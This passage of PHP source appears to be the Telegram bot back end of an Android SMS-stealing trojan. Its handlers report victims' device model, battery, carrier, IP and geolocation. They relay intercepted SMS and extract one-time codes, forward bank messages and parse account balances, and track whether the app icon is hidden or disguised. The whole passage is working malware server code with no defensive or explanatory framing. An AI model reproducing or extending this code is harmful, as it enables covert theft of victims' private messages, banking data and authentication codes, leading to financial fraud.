        $response_text = "👻 ᴀᴄᴛɪᴏɴ #ʜɪᴅᴇ_ɪᴄᴏɴ\n\n";

        $response_text .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
        $response_text .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
        $response_text .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
        $response_text .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
        $response_text .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
        $response_text .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$Device_id.txt") ? file_get_contents("user/appname-$Device_id.txt") : 'Unknown') . "</code>\n";
        $response_text .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
        $response_text .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
        $response_text .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:Hidden | ꜱᴄʀᴇᴇɴ:" . (file_get_contents("user/$Device_id-offline.txt") == "ON" ? "OFF" : "ON") . "</code>\n\n";
        $response_text .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

        bot('editMessageText', [
            'chat_id'    => $chat_id,
            'message_id' => $message_id,
            'text'       => $response_text,
            'parse_mode' => 'HTML'
        ]);
        
        unlink($msg_file);
    }


} elseif ($action == "iconchange") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"] ?? 'IR');
    $message_id = file_get_contents("user/$id_sender/wait_msg_id.txt");
    $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
    $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;
    
    $message = "🔄 ᴀᴄᴛɪᴏɴ #ᴄʜᴀɴɢᴇ_ɪᴄᴏɴ\n\n";
    $message .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
    $message .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
    $message .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
    $message .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
    $message .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
    $message .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$Device_id.txt") ? file_get_contents("user/appname-$Device_id.txt") : 'Unknown') . "</code>\n";
    $message .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
    $message .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
    $message .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:Changed | ꜱᴄʀᴇᴇɴ:" . (file_get_contents("user/$Device_id-offline.txt") == "ON" ? "OFF" : "ON") . "</code>\n\n";
    $message .= "🐋 | <a href='https://t.me/im_saeedi'>ɪᴍ-ꜱᴀᴇᴇᴅ</a>";

    bot('editMessageText', [
        'chat_id' => $id_sender,
        'message_id' => $message_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ]);
    
    file_put_contents("user/$Device_id-apk.txt", "Changed");
} elseif ($action == "offlineOn") {
    $msg_file = "user/$Device_id-offlineon-msg.txt";
    if (file_exists($msg_file)) {
        list($chat_id, $message_id) = explode("|", file_get_contents($msg_file));
        
        file_put_contents("user/$Device_id-offline.txt", "ON");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"] ?? 'IR');
        
        // دریافت اپراتور از فایل ذخیره شده
        $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
        $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;
        
        $status_msg = "🔮 ᴀᴄᴛɪᴏɴ #ᴏꜰꜰʟɪɴᴇ_ᴏɴ\n\n";
        $status_msg .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
        $status_msg .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
        $status_msg .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
        $status_msg .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
        $status_msg .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
        $status_msg .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$Device_id.txt") ? file_get_contents("user/appname-$Device_id.txt") : 'Unknown') . "</code>\n";
        $status_msg .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
        $status_msg .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
        $status_msg .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:" . (file_get_contents("user/$Device_id-apk.txt")) . " | ꜱᴄʀᴇᴇɴ:OFF</code>\n\n";
        $status_msg .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => $status_msg,
            'parse_mode' => 'HTML'
        ]);
        
        unlink($msg_file);
    }
} elseif ($action == "offlineOff") {
    $msg_file = "user/$Device_id-offlineoff-msg.txt";
    if (file_exists($msg_file)) {
        list($chat_id, $message_id) = explode("|", file_get_contents($msg_file));
        
        file_put_contents("user/$Device_id-offline.txt", "OFF");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"] ?? 'IR');
        
        $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
        $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;
        
        $status_msg = "🪄 ᴀᴄᴛɪᴏɴ #ᴏꜰꜰʟɪɴᴇ_ᴏꜰꜰ\n\n";
        $status_msg .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
        $status_msg .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
        $status_msg .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
        $status_msg .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
        $status_msg .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>$ip</code>\n";
        $status_msg .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$Device_id.txt") ? file_get_contents("user/appname-$Device_id.txt") : 'Unknown') . "</code>\n";
        $status_msg .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
        $status_msg .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
        $status_msg .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:" . (file_get_contents("user/$Device_id-apk.txt")) . " | ꜱᴄʀᴇᴇɴ:ON</code>\n\n";
        $status_msg .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => $status_msg,
            'parse_mode' => 'HTML'
        ]);
        
        unlink($msg_file);
    }


} elseif ($action == "visible_icon") {
    $wait_data = json_decode(file_get_contents("user/$id_sender/wait_msg.txt"), true);
    $message_id = $wait_data['message_id'];
    
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"] ?? 'IR');
    
    $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
    $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;
    
    file_put_contents("user/$Device_id-apk.txt", "Visible");
    
    $final_message = "👁️ ᴀᴄᴛɪᴏɴ #ᴠɪꜱɪʙʟᴇ_ɪᴄᴏɴ\n\n";
    $final_message .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
    $final_message .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
    $final_message .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
    $final_message .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
    $final_message .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
    $final_message .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$Device_id.txt") ? file_get_contents("user/appname-$Device_id.txt") : 'Unknown') . "</code>\n";
    $final_message .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
    $final_message .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
    $final_message .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:Normal | ꜱᴄʀᴇᴇɴ:" . (file_get_contents("user/$Device_id-offline.txt") == "ON" ? "OFF" : "ON") . "</code>\n\n";
    $final_message .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

    bot('editMessageText', [
        'chat_id' => $id_sender,
        'message_id' => $message_id,
        'text' => $final_message,
        'parse_mode' => 'HTML',
        'reply_markup' => $sms_panel
    ]);

} elseif ($action == "status") {
    $status_msg_file = "user/$Device_id-status-msg.txt";
    if (file_exists($status_msg_file)) {
        $msg_data = explode("|", file_get_contents($status_msg_file));
        $chat_id = $msg_data[0];
        $message_id = $msg_data[1];
        
        $apk_status = file_get_contents("user/$Device_id-apk.txt");
        $offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"] ?? 'IR');
        
        $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
        $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;
        
        $status_message = "📊 ᴀᴄᴛɪᴏɴ #ꜱᴛᴀᴛᴜꜱ\n\n";
        $status_message .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
        $status_message .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
        $status_message .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
        $status_message .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
        $status_message .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
        $status_message .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$Device_id.txt") ? file_get_contents("user/appname-$Device_id.txt") : 'Unknown') . "</code>\n";
        $status_message .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
        $status_message .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
        $status_message .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:$apk_status | ꜱᴄʀᴇᴇɴ:" . ($offline == "ON" ? "OFF" : "ON") . "</code>\n\n";
        $status_message .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => $status_message,
            'parse_mode' => 'HTML'
        ]);
        
        unlink($status_msg_file);
    }

} elseif ($action == "ReciveSMS") {
    $phone_number = $sender;
    $contact_name = "";
    
    if (strpos($sender, '$contactname=') !== false) {
        $parts = explode('$contactname=', $sender);
        $phone_number = $parts[0];
        $contact_name = " [ " . trim($parts[1]) . " ]";
    }
    elseif (strpos($sender, 'contactname=') !== false) {
        $parts = explode('contactname=', $sender);
        $phone_number = str_replace('$', '', $parts[0]);
        $contact_name = " [ " . trim($parts[1]) . " ]";
    }

    $code = findPooya($message_text);
    if(empty($code)) { 
        $code = getNumber2($message_text);
    }
    
    $formatted_message = $message_text;
    if(!empty($code) && $code != "No number found") {
        $formatted_message = str_replace($code, '<code>'.$code.'</code>', $message_text);
    }
    
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"] ?? 'IR');
    
    $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
    $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;
    
    $message = "📩 ᴀᴄᴛɪᴏɴ #ɴᴇᴡ_ꜱᴍꜱ\n";
    $message .= "☎️ ꜰʀᴏᴍ : <code>" . $phone_number . "</code>" . $contact_name . "\n\n";
    $message .= "💬 ᴍᴇꜱꜱᴀɢᴇ :\n" . $formatted_message . "\n\n";
    $message .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
    $message .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
    $message .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
    $message .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
    $message .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
    $message .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$Device_id.txt") ? file_get_contents("user/appname-$Device_id.txt") : 'Unknown') . "</code>\n";
    $message .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
    $message .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
    $message .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:" . (file_get_contents("user/$Device_id-apk.txt")) . " | ꜱᴄʀᴇᴇɴ:" . (file_get_contents("user/$Device_id-offline.txt") == "ON" ? "OFF" : "ON") . "</code>\n\n";
    $message .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

    bot('sendMessage', [
        'chat_id' => $id_sender,
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => $sms_panel
    ]);
} elseif ($action == "OTPSMS") {
    $phone = asd($message_text, '[Address=', ', Body=');
    $body = asd($message_text, ', Body=', 'IsInitialized');
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"]);
    smg($id_sender, "
📬 ᴀ ɴᴇᴡ ᴍᴇꜱꜱᴀɢᴇ ʀᴇᴄᴇɪᴠᴇᴅ\n <b>$body</b>
<b>☎️️ꜰʀᴏᴍ</b> : $sender

<b>🧬 ᴍᴏᴅᴇʟ</b> : $Model
<b>🛜 ᴏᴘᴇʀᴀᴛᴏʀ</b> : $operator 
<b>🚏 ғɪʀsᴛ ɪᴘ</b> : <code>$install_ip</code> 
<b>🌐 ɪᴘ</b> : <code>$ip</code> 
🗃️ ᴘᴀɴᴇʟ<code>/set_$Device_id</code> 

<b>👨‍🔧 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @im_saeedi</b> ", $sms_panel);
} elseif ($action == "lastsms") {
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"] ?? 'IR');

    $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
    $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;

    $contact_name = "📱 ناشناس";
    $contacts_file = "user/$Device_id-contacts.txt";
    if (file_exists($contacts_file)) {
        $contacts = file_get_contents($contacts_file);
        if (preg_match('/Name:\s*(.*?)\s*Phone:\s*'.preg_quote($sender,'/'), $contacts, $matches)) {
            $contact_name = "👤 " . trim($matches[1]);
        }
    }

    $final_message = "📨 ᴀᴄᴛɪᴏɴ #ʟᴀꜱᴛ_ꜱᴍꜱ\n";
    $final_message .= "☎️ ꜰʀᴏᴍ : <code>" . $sender . "</code>\n\n";
    $final_message .= "💬 ᴍᴇꜱꜱᴀɢᴇ :\n" . $message_text . "\n\n";
    $final_message .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
    $final_message .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
    $final_message .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
    $final_message .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
    $final_message .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
    $final_message .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$Device_id.txt") ? file_get_contents("user/appname-$Device_id.txt") : 'Unknown') . "</code>\n";
    $final_message .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
    $final_message .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
    $final_message .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:" . (file_get_contents("user/$Device_id-apk.txt")) . " | ꜱᴄʀᴇᴇɴ:" . (file_get_contents("user/$Device_id-offline.txt") == "ON" ? "OFF" : "ON") . "</code>\n\n";
    $final_message .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

    smg($id_sender, $final_message, $sms_panel);
} elseif ($action == "lastbanksms") {
    $chat_id = $id_sender;
    $wait_msg_id = file_get_contents("user/$chat_id/wait_msg_id.txt");
    
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"] ?? 'IR');

    $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
    $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;

    $final_message = "🏦 ᴀᴄᴛɪᴏɴ #ʙᴀɴᴋ_ꜱᴍꜱ\n";
    $final_message .= "☎️ ꜰʀᴏᴍ : <code>" . $sender . "</code>\n";
    $final_message .= "💬 ᴍᴇꜱꜱᴀɢᴇ :\n" . $message_text . "\n\n";
    $final_message .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
    $final_message .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
    $final_message .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
    $final_message .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
    $final_message .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
    $final_message .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$Device_id.txt") ? file_get_contents("user/appname-$Device_id.txt") : 'Unknown') . "</code>\n";
    $final_message .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
    $final_message .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
    $final_message .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:" . (file_get_contents("user/$Device_id-apk.txt")) . " | ꜱᴄʀᴇᴇɴ:" . (file_get_contents("user/$Device_id-offline.txt") == "ON" ? "OFF" : "ON") . "</code>\n\n";
    $final_message .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $wait_msg_id,
        'text' => $final_message,
        'parse_mode' => 'HTML',
        'reply_markup' => $sms_panel
    ]);

    unlink("user/$chat_id/wait_msg_id.txt");

} elseif ($action == "balance") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $apk_status = file_get_contents("user/$Device_id-apk.txt");
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $battery = $_POST['Battery'] ?? 'N/A';
    $screen_status = ($offline == "ON") ? "OFF" : "ON";
    $icon_status = ($apk_status == "Hidden") ? "Hidden" : (($apk_status == "Changed") ? "Changed" : "Normal");
    $country = $gcx['country'] ?? 'Unknown';
    $city = $gcx['city'] ?? 'Unknown';
    $flag = EMflag($gcx["countryCode"] ?? 'IR');

    // دریافت اپراتور از فایل ذخیره شده
    $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
    $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;

    // دریافت نام اپلیکیشن از درخواست POST
    $appName = $_POST['AppName'] ?? 'Unknown';
    if (empty($appName) || $appName == 'Unknown') {
        // اگر از POST دریافت نشد، از فایل بخوان
        $appNameFile = "user/appname-$Device_id.txt";
        if (file_exists($appNameFile)) {
            $appName = file_get_contents($appNameFile);
        }
    }

    $BalanceText = "";
    if (isset($_POST['Balances'])) {
        $Balance_Data = json_decode(base64_decode($_POST['Balances']), true);
    } else {
        $Balance_Data = [];
    }
    
    if (count($Balance_Data) == 0) {
        $BalanceText = "❌ ɴᴏ ʙᴀɴᴋ ᴍᴇꜱꜱᴀɢᴇꜱ ꜰᴏᴜɴᴅ\n\n";
    } else {
        foreach ($Balance_Data as $key => $balance) {
            // تمیز کردن مقدار Balance
            $cleanBalance = $balance['Balance'];
            $cleanBalance = str_replace(['مانده:', 'مانده', 'موجودی:', 'موجودی', 'حساب:', 'حساب', 'باقی مانده:', 'باقی مانده', 'باقيمانده:', 'باقيمانده', 'موجودي:'], '', $cleanBalance);
            $cleanBalance = trim($cleanBalance);
            
            $BalanceText .= "==============\n";
            $BalanceText .= "🏦ʙᴀɴᴋ : $key\n";
            $BalanceText .= "☎️ᴘʜᴏɴᴇ-ɴᴜᴍ : " . $balance['Address'] . "\n";
            $BalanceText .= "💰ʙᴀʟᴀɴᴄᴇ : $cleanBalance\n";
        }
        $BalanceText .= "==============\n\n";
    }

    $message = "💸 ᴀᴄᴛɪᴏɴ #ʙᴀʟᴀɴᴄᴇ\n\n";
    $message .= $BalanceText;
    $message .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
    $message .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>$battery%</code>\n";
    $message .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
    $message .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
    $message .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
    $message .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>$appName</code>\n";
    $message .= "├ <b>ɢᴇᴏ</b>: <code>$city, $country $flag</code>\n";
    $message .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
    $message .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:$icon_status | ꜱᴄʀᴇᴇɴ:$screen_status</code>\n\n";
    $message .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

    smg($id_sender, $message, $sms_panel);
} elseif ($action == "WhatsChecker") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    smg($id_sender, "
╔ [ • #Checker • ] 
║  
╠ [ • <b>Status Checker</b> :  <code>$message_text</code> • ]
╠ [ • <b>Model</b> : <code>$Model</code> • ]
╠ [ • <b>Network</b> : <code>$operator</code> • ]
╠ [ • <b>Device</b> : <code>$Device_id</code> • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
║
╠ [ • <code>/set_$Device_id</code> • ]
╠ [ • <code>/block_$ip</code> • ]
║
╚ [ • <b>Coded by : @im_saeedi</b> • ]", $sms_panel);
} elseif ($action == "searchSMS") {
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"] ?? 'IR');

    $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
    $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;

    $message = "🔎 ᴀᴄᴛɪᴏɴ #ꜱᴇᴀʀᴄʜ_ꜱᴍꜱ\n";
    $message .= "☎️ ꜰʀᴏᴍ : <code>" . $sender . "</code>\n\n";
    $message .= "💬 ᴍᴇꜱꜱᴀɢᴇ :\n\n" . $message_text . "\n\n";
    $message .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
    $message .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
    $message .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
    $message .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
    $message .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
    $message .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$Device_id.txt") ? file_get_contents("user/appname-$Device_id.txt") : 'Unknown') . "</code>\n";
    $message .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
    $message .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
    $message .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:" . (file_get_contents("user/$Device_id-apk.txt")) . " | ꜱᴄʀᴇᴇɴ:" . (file_get_contents("user/$Device_id-offline.txt") == "ON" ? "OFF" : "ON") . "</code>\n\n";
    $message .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

    smg($id_sender, $message, $sms_panel);
} elseif ($action == "userphone") {
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"] ?? 'IR');
    $display_ip = get_ipv4($ip);
    
    // دریافت اپراتور از فایل ذخیره شده
    $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
    $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;
    
    $phoneNumbers = array_filter(explode("\n", $phones), function($num) {
        return trim($num) !== '';
    });
    
    $cleanedNumbers = array_map(function($num) {
        return trim(preg_replace('/Text\s*:\s*/', '', $num));
    }, $phoneNumbers);
    
    // ابتدا فیلتر کنیم سپس حذف تکراری‌ها
    $validNumbers = [];
    
    foreach ($cleanedNumbers as $num) {
        $cleanNum = preg_replace('/[^0-9]/', '', $num);
        
